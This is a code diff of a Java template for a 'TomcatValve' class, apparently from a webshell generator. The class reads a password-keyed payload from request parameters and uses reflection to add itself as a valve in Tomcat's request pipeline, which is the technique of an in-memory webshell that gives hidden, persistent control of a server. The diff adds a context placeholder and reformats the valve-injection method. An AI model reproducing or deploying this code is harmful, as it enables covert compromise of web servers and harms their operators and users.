@@ -8,6 +8,7 @@ public class TomcatValve extends ClassLoader implements InvocationHandler {{
 {common}
 {decoder}
 {stub}
+{context}
     private void hook(Object request, Object response) throws Exception {{
         String payload = (String) invokeMethod(
             request, "getParameter", password
@@ -38,11 +39,11 @@ public class TomcatValve extends ClassLoader implements InvocationHandler {{
         return null;
     }}
 
-    private void addValve(Object proxyObject)
-            throws InvocationTargetException, IllegalAccessException {{
+    private void addValve(Object proxyObject) throws Exception {{
         Object context = getStandardContext();
         Object pipeline = invokeMethod(context, "getPipeline");
-        getMethodX(pipeline.getClass(), "addValve", 1).invoke(pipeline, proxyObject);
+        getMethodX(pipeline.getClass(), "addValve", 1)
+            .invoke(pipeline, proxyObject);
     }}
 
     public TomcatValve() {{
